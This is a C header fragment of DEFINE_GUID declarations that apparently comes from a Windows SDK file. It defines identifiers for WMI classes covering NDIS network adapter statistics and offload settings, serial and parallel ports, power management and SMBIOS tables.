DEFINE_GUID(MSNdis_GroupAffinity_GUID, 0xf786fbd5,0xc049,0x11dd,0xb8,0x85,0x00,0x1d,0x09,0x16,0x2b,0xc3);
DEFINE_GUID(MSNdis_HDSplitCurrentConfig_GUID, 0x81d1303c,0xab00,0x4e49,0x80,0xb1,0x5e,0x6e,0x0b,0xf9,0xbe,0x53);
DEFINE_GUID(MSNdis_HDSplitParameters_GUID, 0x1131c56a,0x0a5a,0x4d79,0x8d,0xde,0x1e,0x6f,0x17,0x80,0x05,0xee);
DEFINE_GUID(MSNdis_HardwareStatus_GUID, 0x5ec10354,0xa61a,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_InterruptModerationParameters_GUID, 0x09f58643,0x31fb,0x45b5,0x85,0x2b,0x09,0xb4,0xd3,0xff,0x37,0x65);
DEFINE_GUID(MSNdis_LinkParameters_GUID, 0x29380131,0xa312,0x4400,0xbe,0x0c,0x53,0x87,0x7a,0x41,0xc4,0x65);
DEFINE_GUID(MSNdis_LinkSpeed_GUID, 0x5ec10359,0xa61a,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_LinkStateData_GUID, 0x5b26b94f,0x0272,0x4d4c,0x87,0x44,0xbd,0x84,0xbe,0x42,0x1f,0x3b);
DEFINE_GUID(MSNdis_LinkState_GUID, 0xba1f4c14,0xa945,0x4762,0xb9,0x16,0x0b,0x55,0x15,0xb6,0xf4,0x3a);
DEFINE_GUID(MSNdis_MacOptions_GUID, 0x5ec10365,0xa61a,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_MaximumFrameSize_GUID, 0x5ec10358,0xa61a,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_MaximumLookahead_GUID, 0x5ec10357,0xa61a,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_MaximumSendPackets_GUID, 0x5ec10367,0xa61a,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_MaximumTotalSize_GUID, 0x5ec10363,0xa61a,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_MediaConnectStatus_GUID, 0x5ec10366,0xa61a,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_MediaInUse_GUID, 0x5ec10356,0xa61a,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_MediaSupported_GUID, 0x5ec10355,0xa61a,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_NdisEnumerateVc_GUID, 0x981f2d82,0xb1f3,0x11d0,0x8d,0xd7,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_NetworkAddress_GUID, 0xb5bd98b7,0x0201,0x11d1,0xa5,0x0e,0x00,0xa0,0xc9,0x06,0x29,0x10);
DEFINE_GUID(MSNdis_NetworkLinkSpeed_GUID, 0x60fc6b57,0x0f66,0x11d1,0x96,0xa7,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_NetworkShortAddress_GUID, 0xb5bd98b8,0x0201,0x11d1,0xa5,0x0e,0x00,0xa0,0xc9,0x06,0x29,0x10);
DEFINE_GUID(MSNdis_NicSwitchCapabilities_GUID, 0xdb80dd1c,0x59ae,0x48e7,0xb7,0xec,0xf9,0xbe,0x2c,0x4b,0x8c,0xb0);
DEFINE_GUID(MSNdis_NotifyAdapterArrival_GUID, 0x981f2d81,0xb1f3,0x11d0,0x8d,0xd7,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_NotifyAdapterRemoval_GUID, 0x981f2d80,0xb1f3,0x11d0,0x8d,0xd7,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_NotifyFilterArrival_GUID, 0x0b6d3c89,0x5917,0x43ca,0xb5,0x78,0xd0,0x1a,0x79,0x67,0xc4,0x1c);
DEFINE_GUID(MSNdis_NotifyFilterRemoval_GUID, 0x1f177cd9,0x5955,0x4721,0x9f,0x6a,0x78,0xeb,0xdf,0xae,0xf8,0x89);
DEFINE_GUID(MSNdis_NotifyVcArrival_GUID, 0x182f9e0c,0xb1f3,0x11d0,0x8d,0xd7,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_NotifyVcRemoval_GUID, 0x981f2d79,0xb1f3,0x11d0,0x8d,0xd7,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_ObjectHeader_GUID, 0x2b1831b2,0x2216,0x4ede,0xa4,0x69,0x9f,0xe3,0xdd,0x6d,0x5a,0x7e);
DEFINE_GUID(MSNdis_PMAdminConfigParam_GUID, 0x492dc449,0x13d9,0x4bd6,0x89,0xd4,0x96,0xe3,0x53,0x4e,0x6a,0x05);
DEFINE_GUID(MSNdis_PMAdminConfigState_GUID, 0x0cffd0fc,0x8333,0x4000,0x9a,0x3b,0x20,0x07,0x35,0xd6,0x98,0xf9);
DEFINE_GUID(MSNdis_PMAdminConfig_GUID, 0x1528d111,0x708a,0x4ca4,0x92,0x15,0xc0,0x57,0x71,0x16,0x1c,0xda);
DEFINE_GUID(MSNdis_PMCapabilitiesParam_GUID, 0xcccb122d,0xd5c4,0x4ee1,0x80,0x01,0xb8,0xad,0x6d,0x3c,0xe8,0x76);
DEFINE_GUID(MSNdis_PMCapabilities_GUID, 0xb2cf76e3,0xb3ae,0x4394,0xa0,0x1f,0x33,0x8c,0x98,0x70,0xe9,0x39);
DEFINE_GUID(MSNdis_PMCapabilityState_GUID, 0xc1cc6857,0x1a26,0x4f6d,0xab,0x98,0x29,0x1f,0x0c,0x3b,0xbd,0x4c);
DEFINE_GUID(MSNdis_PciDeviceProperty_GUID, 0x0573f70f,0xded8,0x401c,0x8b,0x56,0xa6,0x2b,0xb5,0x28,0xc0,0xe2);
DEFINE_GUID(MSNdis_PhysicalMediumType_GUID, 0x418ca16d,0x3937,0x4208,0x94,0x0a,0xec,0x61,0x96,0x27,0x80,0x85);
DEFINE_GUID(MSNdis_PortArray_GUID, 0x0fee8708,0xdf65,0x456e,0xb4,0xca,0xfa,0x62,0x32,0x66,0xa1,0x2a);
DEFINE_GUID(MSNdis_PortAuthParameters_GUID, 0x5c3bda24,0x8b64,0x4829,0xa5,0x87,0x8c,0xe7,0x19,0x15,0x2f,0xe2);
DEFINE_GUID(MSNdis_PortChar_GUID, 0xf5b7d202,0xe594,0x4aa3,0xbe,0x43,0x49,0x76,0x83,0x3c,0x78,0x40);
DEFINE_GUID(MSNdis_PortStateData_GUID, 0x8feae2c6,0xee28,0x469f,0x8b,0x5d,0x9f,0x74,0x3b,0xab,0x21,0xaa);
DEFINE_GUID(MSNdis_QueryInterruptModeration_GUID, 0xd9c8eea5,0xf16e,0x467c,0x84,0xd5,0x63,0x45,0xa2,0x2c,0xe2,0x13);
DEFINE_GUID(MSNdis_QueryNicSwitchCurrentCapabilities_GUID, 0xe76fdaf3,0x0be7,0x4d95,0x87,0xe9,0x5a,0xea,0xd4,0xb5,0x90,0xe9);
DEFINE_GUID(MSNdis_QueryNicSwitchHardwareCapabilities_GUID, 0x37cab40c,0xd1e8,0x4301,0x8c,0x1d,0x58,0x46,0x5e,0x0c,0x4c,0x0f);
DEFINE_GUID(MSNdis_QueryPciDeviceCustomProperty_GUID, 0xaa39f5ab,0xe260,0x4d01,0x82,0xb0,0xb7,0x37,0xc8,0x80,0xea,0x05);
DEFINE_GUID(MSNdis_QueryPhysicalMediumTypeEx_GUID, 0x899e7782,0x035b,0x43f9,0x8b,0xb6,0x2b,0x58,0x97,0x16,0x12,0xe5);
DEFINE_GUID(MSNdis_QueryPortState_GUID, 0x6fbf2a5f,0x8b8f,0x4920,0x81,0x43,0xe6,0xc4,0x60,0xf5,0x25,0x24);
DEFINE_GUID(MSNdis_QueryReceiveFilterCurrentCapabilities_GUID, 0x4054e80f,0x2bc1,0x4ccc,0xb0,0x33,0x4a,0xbc,0x0c,0x4a,0x1e,0x8c);
DEFINE_GUID(MSNdis_QueryReceiveFilterGlobalParameters_GUID, 0x3f2c141a,0x83bc,0x11dd,0x94,0xb8,0x00,0x1d,0x09,0x16,0x2b,0xc3);
DEFINE_GUID(MSNdis_QueryReceiveFilterHardwareCapabilities_GUID, 0x3f2c1419,0x83bc,0x11dd,0x94,0xb8,0x00,0x1d,0x09,0x16,0x2b,0xc3);
DEFINE_GUID(MSNdis_QueryReceiveFilterParameters_GUID, 0x3f2c141e,0x83bc,0x11dd,0x94,0xb8,0x00,0x1d,0x09,0x16,0x2b,0xc3);
DEFINE_GUID(MSNdis_QueryReceiveQueueParameters_GUID, 0x3f2c141c,0x83bc,0x11dd,0x94,0xb8,0x00,0x1d,0x09,0x16,0x2b,0xc3);
DEFINE_GUID(MSNdis_QueryStatisticsInfo_GUID, 0x368c45b5,0xc129,0x43c1,0x93,0x9e,0x7e,0xdc,0x2d,0x7f,0xe6,0x21);
DEFINE_GUID(MSNdis_RSSEnabled_GUID, 0x9565cd55,0x3402,0x4e32,0xa5,0xb6,0x2f,0x14,0x3f,0x2f,0x2c,0x30);
DEFINE_GUID(MSNdis_ReceiveBlockSize_GUID, 0x5ec1035d,0xa61a,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_ReceiveBufferSpace_GUID, 0x5ec1035b,0xa61a,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_ReceiveError_GUID, 0x447956fd,0xa61b,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_ReceiveFilterCapabilities_GUID, 0x146360a3,0x88dd,0x11dd,0x94,0xb8,0x00,0x1d,0x09,0x16,0x2b,0xc3);
DEFINE_GUID(MSNdis_ReceiveFilterFieldParameters_GUID, 0x146360ab,0x88dd,0x11dd,0x94,0xb8,0x00,0x1d,0x09,0x16,0x2b,0xc3);
DEFINE_GUID(MSNdis_ReceiveFilterGlobalParameters_GUID, 0x146360a4,0x88dd,0x11dd,0x94,0xb8,0x00,0x1d,0x09,0x16,0x2b,0xc3);
DEFINE_GUID(MSNdis_ReceiveFilterInfoArray_GUID, 0x146360aa,0x88dd,0x11dd,0x94,0xb8,0x00,0x1d,0x09,0x16,0x2b,0xc3);
DEFINE_GUID(MSNdis_ReceiveFilterInfo_GUID, 0x146360a9,0x88dd,0x11dd,0x94,0xb8,0x00,0x1d,0x09,0x16,0x2b,0xc3);
DEFINE_GUID(MSNdis_ReceiveFilterParameters_GUID, 0x146360ac,0x88dd,0x11dd,0x94,0xb8,0x00,0x1d,0x09,0x16,0x2b,0xc3);
DEFINE_GUID(MSNdis_ReceiveNoBuffer_GUID, 0x447956fe,0xa61b,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_ReceiveQueueInfoArray_GUID, 0xf786fbd8,0xc049,0x11dd,0xb8,0x85,0x00,0x1d,0x09,0x16,0x2b,0xc3);
DEFINE_GUID(MSNdis_ReceiveQueueInfo_GUID, 0xf786fbd7,0xc049,0x11dd,0xb8,0x85,0x00,0x1d,0x09,0x16,0x2b,0xc3);
DEFINE_GUID(MSNdis_ReceiveQueueParameters_GUID, 0xf786fbd6,0xc049,0x11dd,0xb8,0x85,0x00,0x1d,0x09,0x16,0x2b,0xc3);
DEFINE_GUID(MSNdis_ReceiveScaleCapabilities_GUID, 0x26c28774,0x4252,0x48fe,0xa6,0x10,0xa5,0x8a,0x39,0x8c,0x0e,0xb1);
DEFINE_GUID(MSNdis_ReceivesOk_GUID, 0x447956fb,0xa61b,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_SetHDSplitParameters_GUID, 0x8c048bea,0x2913,0x4458,0xb6,0x8e,0x17,0xf6,0xc1,0xe5,0xc6,0x0e);
DEFINE_GUID(MSNdis_SetInterruptModeration_GUID, 0xd789adfa,0x9c56,0x433b,0xad,0x01,0x75,0x74,0xf3,0xce,0xdb,0xe9);
DEFINE_GUID(MSNdis_SetLinkParameters_GUID, 0x8c7d3579,0x252b,0x4614,0x82,0xc5,0xa6,0x50,0xda,0xa1,0x50,0x49);
DEFINE_GUID(MSNdis_SetPortParameters_GUID, 0xaab6ac31,0x86fb,0x48fb,0x8b,0x48,0x63,0xdb,0x23,0x5a,0xce,0x16);
DEFINE_GUID(MSNdis_SetTcpOffloadParameters_GUID, 0x8ead9a22,0x7f69,0x4bc6,0x94,0x9a,0xc8,0x18,0x7b,0x07,0x4e,0x61);
DEFINE_GUID(MSNdis_StatisticsInfo_GUID, 0x8ecc74e1,0xba85,0x482e,0xaf,0xaf,0xb4,0xf8,0xb0,0x87,0xc0,0x6b);
DEFINE_GUID(MSNdis_StatusDevicePowerOffEx_GUID, 0x4159353c,0x5cd7,0x42ce,0x8f,0xe4,0xa4,0x5a,0x23,0x80,0xcc,0x4f);
DEFINE_GUID(MSNdis_StatusDevicePowerOff_GUID, 0x81bc8189,0xb026,0x46ab,0x64,0xb9,0xf1,0x82,0xe3,0x42,0x93,0x4e);
DEFINE_GUID(MSNdis_StatusDevicePowerOnEx_GUID, 0x2b440188,0x92ac,0x4f60,0x9b,0x2d,0x20,0xa3,0x0c,0xbb,0x6b,0xbe);
DEFINE_GUID(MSNdis_StatusDevicePowerOn_GUID, 0x5f81cfd0,0xf046,0x4342,0x61,0xaf,0x89,0x5a,0xce,0xda,0xef,0xd9);
DEFINE_GUID(MSNdis_StatusDot11AssociationCompletion_GUID, 0x458bbea7,0x45a4,0x4ae2,0xb1,0x76,0xe5,0x1f,0x96,0xfc,0x05,0x68);
DEFINE_GUID(MSNdis_StatusDot11AssociationStart_GUID, 0x3927843b,0x6980,0x4b48,0xb1,0x5b,0x4d,0xe5,0x09,0x77,0xac,0x40);
DEFINE_GUID(MSNdis_StatusDot11ConnectionCompletion_GUID, 0x96efd9c9,0x7f1b,0x4a89,0xbc,0x04,0x3e,0x9e,0x27,0x17,0x65,0xf1);
DEFINE_GUID(MSNdis_StatusDot11ConnectionStart_GUID, 0x7b74299d,0x998f,0x4454,0xad,0x08,0xc5,0xaf,0x28,0x57,0x6d,0x1b);
DEFINE_GUID(MSNdis_StatusDot11Disassociation_GUID, 0x3fbeb6fc,0x0fe2,0x43fd,0xb2,0xad,0xbd,0x99,0xb5,0xf9,0x3e,0x13);
DEFINE_GUID(MSNdis_StatusDot11LinkQuality_GUID, 0xa3285184,0xea99,0x48ed,0x82,0x5e,0xa4,0x26,0xb1,0x1c,0x27,0x54);
DEFINE_GUID(MSNdis_StatusDot11MPDUMaxLengthChange_GUID, 0x1d6560ec,0x8e48,0x4a3e,0x9f,0xd5,0xa0,0x1b,0x69,0x8d,0xb6,0xc5);
DEFINE_GUID(MSNdis_StatusDot11PhyStateChange_GUID, 0xdeb45316,0x71b5,0x4736,0xbd,0xef,0x0a,0x9e,0x9f,0x4e,0x62,0xdc);
DEFINE_GUID(MSNdis_StatusDot11PmkidCandidateList_GUID, 0x26d8b8f6,0xdb82,0x49eb,0x8b,0xf3,0x4c,0x13,0x0e,0xf0,0x69,0x50);
DEFINE_GUID(MSNdis_StatusDot11RoamingCompletion_GUID, 0xdd9d47d1,0x282b,0x41e4,0xb9,0x24,0x66,0x36,0x88,0x17,0xfc,0xd3);
DEFINE_GUID(MSNdis_StatusDot11RoamingStart_GUID, 0xb2412d0d,0x26c8,0x4f4e,0x93,0xdf,0xf7,0xb7,0x05,0xa0,0xb4,0x33);
DEFINE_GUID(MSNdis_StatusDot11ScanConfirm_GUID, 0x8500591e,0xa0c7,0x4efb,0x93,0x42,0xb6,0x74,0xb0,0x02,0xcb,0xe6);
DEFINE_GUID(MSNdis_StatusDot11TkipmicFailure_GUID, 0x442c2ae4,0x9bc5,0x4b90,0xa8,0x89,0x45,0x5e,0xf2,0x20,0xf4,0xee);
DEFINE_GUID(MSNdis_StatusHDSplitCurrentConfig_GUID, 0x6c744b0e,0xee9c,0x4205,0x90,0xa2,0x01,0x5f,0x6d,0x65,0xf4,0x03);
DEFINE_GUID(MSNdis_StatusLinkSpeedChange_GUID, 0x981f2d85,0xb1f3,0x11d0,0x8d,0xd7,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_StatusLinkState_GUID, 0x64c6f797,0x878c,0x4311,0x92,0x46,0x65,0xdb,0xa8,0x9c,0x3a,0x61);
DEFINE_GUID(MSNdis_StatusMediaConnect_GUID, 0x981f2d7d,0xb1f3,0x11d0,0x8d,0xd7,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_StatusMediaDisconnect_GUID, 0x981f2d7e,0xb1f3,0x11d0,0x8d,0xd7,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_StatusMediaSpecificIndicationEx_GUID, 0xaaacfca7,0x954a,0x4632,0xa1,0x6e,0xa8,0xa6,0x37,0x93,0xa9,0xe5);
DEFINE_GUID(MSNdis_StatusMediaSpecificIndication_GUID, 0x981f2d84,0xb1f3,0x11d0,0x8d,0xd7,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_StatusNetworkChange_GUID, 0xca8a56f9,0xce81,0x40e6,0xa7,0x0f,0xa0,0x67,0xa4,0x76,0xe9,0xe9);
DEFINE_GUID(MSNdis_StatusOperationalStatus_GUID, 0xf917b663,0x845e,0x4d3d,0xb6,0xd4,0x15,0xeb,0x27,0xaf,0x81,0xc5);
DEFINE_GUID(MSNdis_StatusPacketFilterChange_GUID, 0xd47c5407,0x2e75,0x46dd,0x81,0x46,0x1d,0x7e,0xd2,0xd6,0xab,0x1d);
DEFINE_GUID(MSNdis_StatusPortState_GUID, 0x1dac0dfe,0x43e5,0x44b7,0xb7,0x59,0x7b,0xf4,0x6d,0xe3,0x2e,0x81);
DEFINE_GUID(MSNdis_StatusProtocolBind_GUID, 0x5413531c,0xb1f3,0x11d0,0xd7,0x8d,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_StatusProtocolUnbind_GUID, 0x6e3ce1ec,0xb1f3,0x11d0,0xd7,0x8d,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_StatusResetEnd_GUID, 0x981f2d77,0xb1f3,0x11d0,0x8d,0xd7,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_StatusResetStart_GUID, 0x981f2d76,0xb1f3,0x11d0,0x8d,0xd7,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_StatusTaskOffloadChange_GUID, 0x45049fc6,0x54d8,0x40c8,0x9c,0x3d,0xb0,0x11,0xc4,0xe7,0x15,0xbc);
DEFINE_GUID(MSNdis_TcpConnectionOffloadCurrentConfig_GUID, 0x2ee6aef1,0x0851,0x458b,0xbf,0x0d,0x79,0x23,0x43,0xd1,0xcd,0xe1);
DEFINE_GUID(MSNdis_TcpConnectionOffloadHardwareConfig_GUID, 0x8ce71f2c,0xd63a,0x4390,0xa4,0x87,0x18,0xfa,0x47,0x26,0x2c,0xeb);
DEFINE_GUID(MSNdis_TcpOffloadCurrentConfig_GUID, 0x68542fed,0x5c74,0x461e,0x89,0x34,0x91,0xc6,0xf9,0xc6,0x09,0x60);
DEFINE_GUID(MSNdis_TcpOffloadHardwareConfig_GUID, 0xcd5f1102,0x590f,0x4ada,0xab,0x65,0x5b,0x31,0xb1,0xdc,0x01,0x72);
DEFINE_GUID(MSNdis_TcpOffloadParameters_GUID, 0x43fe82d8,0x3468,0x497e,0x9d,0xcf,0xf8,0xff,0xc0,0x13,0x37,0x44);
DEFINE_GUID(MSNdis_TokenRingCurrentAddress_GUID, 0x44795708,0xa61b,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_TokenRingCurrentFunctional_GUID, 0x44795709,0xa61b,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_TokenRingCurrentGroup_GUID, 0x4479570a,0xa61b,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_TokenRingCurrentRingState_GUID, 0xacf14032,0xa61c,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_TokenRingCurrentRingStatus_GUID, 0x890a36ec,0xa61c,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_TokenRingLastOpenStatus_GUID, 0x4479570b,0xa61b,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_TokenRingLineErrors_GUID, 0xacf14033,0xa61c,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_TokenRingLostFrames_GUID, 0xacf14034,0xa61c,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_TokenRingPermanentAddress_GUID, 0x44795707,0xa61b,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_TransmitBlockSize_GUID, 0x5ec1035c,0xa61a,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_TransmitBufferSpace_GUID, 0x5ec1035a,0xa61a,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_TransmitsError_GUID, 0x447956fc,0xa61b,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_TransmitsOk_GUID, 0x447956fa,0xa61b,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_VendorDescription_GUID, 0x5ec1035f,0xa61a,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_VendorDriverVersion_GUID, 0x447956f9,0xa61b,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_VendorID_GUID, 0x5ec1035e,0xa61a,0x11d0,0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c);
DEFINE_GUID(MSNdis_VlanIdentifier_GUID, 0x765dc702,0xc5e8,0x4b67,0x84,0x3b,0x3f,0x5a,0x4f,0xf2,0x64,0x8b);
DEFINE_GUID(MSNdis_WmiEnumAdapter_GUID, 0xe7001b59,0xc3d6,0x4537,0xb4,0x0e,0xa1,0x63,0xd5,0x16,0xe4,0xa3);
DEFINE_GUID(MSNdis_WmiHDSplitCurrentConfig_GUID, 0x34ff16bf,0x30ca,0x4a2a,0xa4,0x6d,0xc7,0xee,0x74,0xbc,0x35,0x82);
DEFINE_GUID(MSNdis_WmiIPSecOffloadV1_GUID, 0x4ec63447,0x2238,0x43a7,0xac,0x33,0x11,0xc7,0xcc,0x7d,0x86,0x65);
DEFINE_GUID(MSNdis_WmiIPSecOffloadV1_IPv4AH_GUID, 0x29bacfdd,0xf063,0x48d8,0x95,0x2c,0xd3,0xdc,0x93,0x30,0x0f,0x15);
DEFINE_GUID(MSNdis_WmiIPSecOffloadV1_IPv4ESP_GUID, 0x86522023,0x4536,0x4b58,0xa1,0xf4,0x25,0x38,0x94,0x1a,0xce,0x43);
DEFINE_GUID(MSNdis_WmiIPSecOffloadV1_Supported_GUID, 0xf86676b9,0xd9fa,0x4d26,0x95,0xce,0xbf,0xbc,0x77,0xd8,0x05,0x96);
DEFINE_GUID(MSNdis_WmiMethodHeader_GUID, 0xe3eac9dd,0x2fd3,0x4963,0xbf,0xfd,0xb4,0x69,0x28,0x88,0xc0,0xd4);
DEFINE_GUID(MSNdis_WmiOffload_GUID, 0x7a877086,0x2204,0x4a8a,0x92,0xa4,0xe3,0xe8,0xab,0x62,0x66,0x29);
DEFINE_GUID(MSNdis_WmiOutputInfo_GUID, 0x7510bb9d,0xdf70,0x4f7e,0xba,0x07,0xe2,0x9d,0x33,0x0b,0x3c,0xc5);
DEFINE_GUID(MSNdis_WmiReceiveScaleCapabilities_GUID, 0xf7a4960a,0xace3,0x44dc,0xb5,0x1e,0x72,0xe0,0x5c,0x5e,0xaf,0xa8);
DEFINE_GUID(MSNdis_WmiSetHeader_GUID, 0x3b5605d8,0x1aaf,0x4ff6,0x85,0xb9,0xbc,0x5f,0xb9,0x73,0xdc,0x54);
DEFINE_GUID(MSNdis_WmiTcpConnectionOffload_GUID, 0x93cfcd3f,0x6228,0x455c,0x90,0x5e,0x3a,0xb8,0x0a,0x2f,0xf0,0x90);
DEFINE_GUID(MSNdis_WmiTcpIpChecksumOffload_GUID, 0x189d4015,0x1b25,0x4d8e,0xa4,0xa9,0xf9,0xeb,0xa8,0x21,0x97,0xc7);
DEFINE_GUID(MSNdis_WmiTcpIpChecksumOffload_IPv4TransmitReceive_GUID, 0xd63d537a,0x59c1,0x4fae,0x8f,0x9b,0xcd,0x9f,0xbb,0xec,0xb8,0x5a);
DEFINE_GUID(MSNdis_WmiTcpIpChecksumOffload_IPv6TransmitReceive_GUID, 0xb9760e75,0x6662,0x49e4,0xaa,0x6c,0xf0,0x28,0xbe,0xfe,0xc8,0xee);
DEFINE_GUID(MSNdis_WmiTcpLargeSendOffloadV1_GUID, 0xb9e4e2f9,0xee89,0x4756,0xb0,0x57,0x38,0xf9,0xd9,0xb5,0x9a,0x92);
DEFINE_GUID(MSNdis_WmiTcpLargeSendOffloadV1_IPv4_GUID, 0xd7673b11,0xe892,0x4a9d,0x8b,0xd8,0x76,0x1f,0xf2,0x56,0xed,0xd9);
DEFINE_GUID(MSNdis_WmiTcpLargeSendOffloadV2_GUID, 0x592977c2,0xcfbe,0x462c,0xb5,0xcf,0x1a,0x76,0x79,0xfe,0x1c,0xba);
DEFINE_GUID(MSNdis_WmiTcpLargeSendOffloadV2_IPv4_GUID, 0x8823d030,0xfa30,0x4b73,0xb3,0x39,0xdb,0x19,0x20,0x7f,0x0d,0x81);
DEFINE_GUID(MSNdis_WmiTcpLargeSendOffloadV2_IPv6_GUID, 0xa7a9597c,0x2f8e,0x410b,0x9b,0xb3,0x5c,0x3a,0x50,0x79,0x2b,0xfc);
DEFINE_GUID(MSParallel_AllocFreeCounts_GUID, 0x4bbb69ea,0x6853,0x11d2,0x8e,0xce,0x00,0xc0,0x4f,0x8e,0xf4,0x81);
DEFINE_GUID(MSParallel_DeviceBytesTransferred_GUID, 0x89fef2d6,0x654b,0x11d2,0x9e,0x15,0x00,0xc0,0x4f,0x8e,0xf4,0x81);
DEFINE_GUID(MSPower_DeviceEnable_GUID, 0x827c0a6f,0xfeb0,0x11d0,0xbd,0x26,0x00,0xaa,0x00,0xb7,0xb3,0x2a);
DEFINE_GUID(MSPower_DeviceWakeEnable_GUID, 0xa9546a82,0xfeb0,0x11d0,0xbd,0x26,0x00,0xaa,0x00,0xb7,0xb3,0x2a);
DEFINE_GUID(MSRedbook_DriverInformationGuid, 0xb90550e7,0xae0a,0x11d1,0xa5,0x71,0x00,0xc0,0x4f,0xa3,0x47,0x30);
DEFINE_GUID(MSRedbook_PerformanceGuid, 0xb90550e8,0xae0a,0x11d1,0xa5,0x71,0x00,0xc0,0x4f,0xa3,0x47,0x30);
DEFINE_GUID(MSSerial_CommInfo_GUID, 0xedb16a62,0xb16c,0x11d1,0xbd,0x98,0x00,0xa0,0xc9,0x06,0xbe,0x2d);
DEFINE_GUID(MSSerial_CommProperties_GUID, 0x8209ec2a,0x2d6b,0x11d2,0xba,0x49,0x00,0xa0,0xc9,0x06,0x29,0x10);
DEFINE_GUID(MSSerial_HardwareConfiguration_GUID, 0x270b9b86,0xb16d,0x11d1,0xbd,0x98,0x00,0xa0,0xc9,0x06,0xbe,0x2d);
DEFINE_GUID(MSSerial_PerformanceInformation_GUID, 0x56415acc,0xb16d,0x11d1,0xbd,0x98,0x00,0xa0,0xc9,0x06,0xbe,0x2d);
DEFINE_GUID(MSSerial_PortName_GUID, 0xa0ec11a8,0xb16c,0x11d1,0xbd,0x98,0x00,0xa0,0xc9,0x06,0xbe,0x2d);
DEFINE_GUID(MSSmBios_RawSMBiosTables_GUID, 0x8f680850,0xa584,0x11d1,0xbf,0x38,0x00,0xa0,0xc9,0x06,0x29,0x10);
DEFINE_GUID(MSSmBios_SMBiosEventlog_GUID, 0x8f680851,0xa584,0x11d1,0xbf,0x38,0x00,0xa0,0xc9,0x06,0x29,0x10);
DEFINE_GUID(MSSmBios_Sysid1394List_GUID, 0x8f680855,0xa584,0x11d1,0xbf,0x38,0x00,0xa0,0xc9,0x06,0x29,0x10);
